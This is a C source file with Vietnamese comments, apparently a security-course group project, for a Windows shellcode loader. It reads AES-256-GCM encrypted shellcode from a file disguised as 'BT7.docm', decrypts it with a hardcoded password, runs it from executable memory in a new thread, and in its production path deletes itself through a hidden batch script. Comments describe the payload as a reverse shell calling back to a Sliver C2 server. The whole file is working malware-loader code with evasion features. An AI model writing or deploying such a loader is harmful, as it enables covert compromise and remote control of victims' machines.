/*
 * AES-256-GCM Shellcode Loader with Memory Injection
 * 1. Đọc file BT7.docm (encrypted shellcode)
 * 2. Giải mã bằng AES-256-GCM
 * 3. Memory injection: VirtualAlloc -> memcpy -> VirtualProtect -> CreateThread
 * 4. Shellcode thực thi reverse shell
 */

#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")

// Cấu hình mã hóa
#define AES_KEY_SIZE 32      // AES-256
#define SALT_SIZE 16
#define NONCE_SIZE 12        // GCM nonce
#define TAG_SIZE 16          // GCM authentication tag

// Password để derive key
const char* PASSWORD = "NT230_Group5_Key";

// Tên file encrypted shellcode - sẽ đổi tên thành .docm
const char* ENCRYPTED_FILE = "BT7.docm";

/*
 * Derive AES key từ password sử dụng PBKDF2
 */
BOOL DeriveKeyFromPassword(
    const char* password,
    BYTE* salt,
    DWORD saltLen,
    BYTE* key,
    DWORD keyLen
) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    NTSTATUS status;
    BOOL result = FALSE;

    // Mở SHA256 algorithm provider cho PBKDF2
    status = BCryptOpenAlgorithmProvider(
        &hAlg,
        BCRYPT_SHA256_ALGORITHM,
        NULL,
        BCRYPT_ALG_HANDLE_HMAC_FLAG
    );
    
    if (!BCRYPT_SUCCESS(status)) {
        return FALSE;
    }

    // Derive key với PBKDF2
    status = BCryptDeriveKeyPBKDF2(
        hAlg,
        (PUCHAR)password,
        strlen(password),
        salt,
        saltLen,
        100000,  // iterations - phải khớp với Python
        key,
        keyLen,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}

/*
 * Giải mã AES-256-GCM sử dụng BCrypt API
 */
BOOL DecryptAESGCM(
    BYTE* encrypted,
    DWORD encryptedLen,
    BYTE* key,
    BYTE* nonce,
    BYTE** decrypted,
    DWORD* decryptedLen
) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL result = FALSE;

    // Mở AES-GCM algorithm
    status = BCryptOpenAlgorithmProvider(
        &hAlg,
        BCRYPT_AES_ALGORITHM,
        NULL,
        0
    );
    if (!BCRYPT_SUCCESS(status)) {
        return FALSE;
    }

    // Set chaining mode to GCM
    status = BCryptSetProperty(
        hAlg,
        BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
        sizeof(BCRYPT_CHAIN_MODE_GCM),
        0
    );
    if (!BCRYPT_SUCCESS(status)) {
        goto cleanup;
    }

    // Import key
    status = BCryptGenerateSymmetricKey(
        hAlg,
        &hKey,
        NULL,
        0,
        key,
        AES_KEY_SIZE,
        0
    );
    if (!BCRYPT_SUCCESS(status)) {
        goto cleanup;
    }

    // Prepare auth info for GCM
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = NONCE_SIZE;
    authInfo.pbTag = encrypted + encryptedLen - TAG_SIZE;  // Tag ở cuối
    authInfo.cbTag = TAG_SIZE;

    // Allocate output buffer
    *decryptedLen = encryptedLen - TAG_SIZE;
    *decrypted = (BYTE*)VirtualAlloc(NULL, *decryptedLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*decrypted == NULL) {
        goto cleanup;
    }

    // Decrypt
    ULONG bytesDecrypted = 0;
    status = BCryptDecrypt(
        hKey,
        encrypted,
        encryptedLen - TAG_SIZE,  // Không bao gồm tag
        &authInfo,
        NULL,
        0,
        *decrypted,
        *decryptedLen,
        &bytesDecrypted,
        0
    );

    if (!BCRYPT_SUCCESS(status)) {
        VirtualFree(*decrypted, 0, MEM_RELEASE);
        *decrypted = NULL;
        goto cleanup;
    }

    *decryptedLen = bytesDecrypted;
    result = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

/*
 * Đọc encrypted shellcode từ file với retry logic
 */
BOOL ReadEncryptedFile(
    const char* filename,
    BYTE** salt,
    BYTE** nonce,
    BYTE** encrypted,
    DWORD* encryptedLen
) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    int retries = 10;  // Retry 10 lần
    int delay = 500;   // Delay 500ms giữa mỗi lần
    
    // Retry logic - đợi file sẵn sàng
    for (int i = 0; i < retries; i++) {
        hFile = CreateFileA(
            filename,
            GENERIC_READ,
            FILE_SHARE_READ,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        
        if (hFile != INVALID_HANDLE_VALUE) {
            break;  // File opened successfully
        }
        
        // Wait trước khi retry
        Sleep(delay);
    }

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    // Get file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize < SALT_SIZE + NONCE_SIZE) {
        CloseHandle(hFile);
        return FALSE;
    }

    // Allocate buffers
    *salt = (BYTE*)malloc(SALT_SIZE);
    *nonce = (BYTE*)malloc(NONCE_SIZE);
    *encryptedLen = fileSize - SALT_SIZE - NONCE_SIZE;
    *encrypted = (BYTE*)malloc(*encryptedLen);

    DWORD bytesRead;

    // Read salt
    if (!ReadFile(hFile, *salt, SALT_SIZE, &bytesRead, NULL)) {
        goto error;
    }

    // Read nonce
    if (!ReadFile(hFile, *nonce, NONCE_SIZE, &bytesRead, NULL)) {
        goto error;
    }

    // Read encrypted data
    if (!ReadFile(hFile, *encrypted, *encryptedLen, &bytesRead, NULL)) {
        goto error;
    }

    CloseHandle(hFile);
    return TRUE;

error:
    free(*salt);
    free(*nonce);
    free(*encrypted);
    CloseHandle(hFile);
    return FALSE;
}

/*
 * Memory Injection - Inject shellcode vào memory và thực thi
 */
BOOL InjectAndExecuteShellcode(BYTE* shellcode, DWORD shellcodeLen) {
    DWORD oldProtect;

    // 1. VirtualAlloc - Cấp phát memory với quyền EXECUTE_READWRITE
    LPVOID execMem = VirtualAlloc(
        NULL,
        shellcodeLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // Dùng RWX luôn, tránh lỗi permission
    );

    if (execMem == NULL) {
        #ifdef DEBUG
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        #endif
        return FALSE;
    }

    #ifdef DEBUG
    printf("[+] Memory allocated at: 0x%p\n", execMem);
    #endif

    // 2. Copy shellcode vào memory
    memcpy(execMem, shellcode, shellcodeLen);

    #ifdef DEBUG
    printf("[+] Shellcode copied to memory\n");
    #endif

    // 3. CreateThread - Tạo thread độc lập
    DWORD threadId;
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)execMem,
        NULL,
        0,  // Start ngay
        &threadId
    );

    if (hThread == NULL) {
        #ifdef DEBUG
        printf("[-] CreateThread failed: %d\n", GetLastError());
        #endif
        VirtualFree(execMem, 0, MEM_RELEASE);
        return FALSE;
    }

    #ifdef DEBUG
    printf("[+] Thread created with ID: %d\n", threadId);
    #endif
    
    // 4. Detach thread handle - thread tự quản lý lifecycle
    CloseHandle(hThread);
    
    // KHÔNG cleanup execMem - shellcode cần memory này

    return TRUE;
}

/*
 * Self-delete executable file
 */
BOOL SelfDelete() {
    char szModuleName[MAX_PATH];
    char szCmd[MAX_PATH * 2];
    char szBatchFile[MAX_PATH];
    
    // Get path của executable hiện tại
    GetModuleFileNameA(NULL, szModuleName, MAX_PATH);
    
    // Tạo temp batch file
    GetTempPathA(MAX_PATH, szBatchFile);
    strcat(szBatchFile, "tmp_del.bat");
    
    // Tạo batch script để xóa executable
    FILE* fp = fopen(szBatchFile, "w");
    if (fp == NULL) {
        return FALSE;
    }
    
    // Batch script: đợi 2 giây, xóa exe, xóa chính nó
    fprintf(fp, "@echo off\n");
    fprintf(fp, "timeout /t 2 /nobreak > nul\n");
    fprintf(fp, "del /f /q \"%s\" > nul 2>&1\n", szModuleName);
    fprintf(fp, "del /f /q \"%%~f0\" > nul 2>&1\n");
    fclose(fp);
    
    // Chạy batch file ẩn
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    sprintf(szCmd, "cmd.exe /c \"%s\"", szBatchFile);
    
    if (!CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

/*
 * Main entry point
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    BYTE* salt = NULL;
    BYTE* nonce = NULL;
    BYTE* encrypted = NULL;
    DWORD encryptedLen = 0;
    BYTE* shellcode = NULL;
    DWORD shellcodeLen = 0;
    BYTE key[AES_KEY_SIZE];

    // Debug: Show console for debugging (comment out for production)
    #ifdef DEBUG
    AllocConsole();
    FILE* console;
    freopen_s(&console, "CONOUT$", "w", stdout);
    printf("[*] Loader started\n");
    #endif

    // 1. Đọc encrypted shellcode từ file
    #ifdef DEBUG
    printf("[*] Reading encrypted file: %s\n", ENCRYPTED_FILE);
    #endif
    
    if (!ReadEncryptedFile(ENCRYPTED_FILE, &salt, &nonce, &encrypted, &encryptedLen)) {
        #ifdef DEBUG
        printf("[-] Failed to read encrypted file\n");
        printf("[-] Error code: %d\n", GetLastError());
        #else
        MessageBoxA(NULL, "Failed to read encrypted file", "Error", MB_OK | MB_ICONERROR);
        #endif
        return 1;
    }

    #ifdef DEBUG
    printf("[+] Encrypted file read successfully\n");
    printf("[+] Encrypted size: %d bytes\n", encryptedLen);
    #endif

    // 2. Derive key từ password
    #ifdef DEBUG
    printf("[*] Deriving key from password...\n");
    #endif
    
    if (!DeriveKeyFromPassword(PASSWORD, salt, SALT_SIZE, key, AES_KEY_SIZE)) {
        #ifdef DEBUG
        printf("[-] Failed to derive key\n");
        #else
        MessageBoxA(NULL, "Failed to derive key", "Error", MB_OK | MB_ICONERROR);
        #endif
        goto cleanup;
    }

    #ifdef DEBUG
    printf("[+] Key derived successfully\n");
    #endif

    // 3. Giải mã shellcode
    #ifdef DEBUG
    printf("[*] Decrypting shellcode...\n");
    #endif
    
    if (!DecryptAESGCM(encrypted, encryptedLen, key, nonce, &shellcode, &shellcodeLen)) {
        #ifdef DEBUG
        printf("[-] Failed to decrypt shellcode\n");
        #else
        MessageBoxA(NULL, "Failed to decrypt shellcode", "Error", MB_OK | MB_ICONERROR);
        #endif
        goto cleanup;
    }

    #ifdef DEBUG
    printf("[+] Shellcode decrypted successfully\n");
    printf("[+] Shellcode size: %d bytes\n", shellcodeLen);
    #endif

    // 4. Inject và thực thi shellcode
    #ifdef DEBUG
    printf("[*] Injecting and executing shellcode...\n");
    #endif
    
    if (!InjectAndExecuteShellcode(shellcode, shellcodeLen)) {
        #ifdef DEBUG
        printf("[-] Failed to execute shellcode\n");
        #else
        MessageBoxA(NULL, "Failed to execute shellcode", "Error", MB_OK | MB_ICONERROR);
        #endif
        goto cleanup;
    }

    #ifdef DEBUG
    printf("[+] Shellcode injected and thread created\n");
    printf("[*] Beacon should callback to C2 now\n");
    printf("[*] Process will stay alive to prevent thread termination\n");
    printf("[*] Keeping process alive for 60 seconds...\n");
    printf("[!] Check Sliver console for beacon connection\n\n");
    
    // Wait 60 giây với status updates
    for (int i = 60; i > 0; i--) {
        if (i % 10 == 0) {
            printf("[*] %d seconds remaining... (Check 'beacons' in Sliver)\n", i);
        }
        Sleep(1000);
    }
    
    printf("\n[*] Timeout reached.\n");
    printf("[*] If beacon connected, it should remain active even after this exits.\n");
    printf("[!] Self-delete disabled in DEBUG mode\n");
    printf("[*] Press Enter to exit...\n");
    getchar();
    #else
    // Production: Keep alive, then self-delete
    Sleep(10000);  // Wait 10 seconds for beacon to callback
    
    // Self-delete executable
    SelfDelete();
    #endif

    // 5. Cleanup memory ngay sau khi inject (shellcode đã được copy vào execMem)
    if (salt) free(salt);
    if (nonce) free(nonce);
    if (encrypted) free(encrypted);
    if (shellcode) VirtualFree(shellcode, 0, MEM_RELEASE);

    // Exit ngay - beacon sẽ chạy trong background thread
    return 0;

cleanup:
    // Cleanup memory
    if (salt) free(salt);
    if (nonce) free(nonce);
    if (encrypted) free(encrypted);
    if (shellcode) VirtualFree(shellcode, 0, MEM_RELEASE);

    #ifdef DEBUG
    printf("[*] Cleanup completed\n");
    printf("[*] Press Enter to exit...\n");
    getchar();
    #endif

    return 1;
}
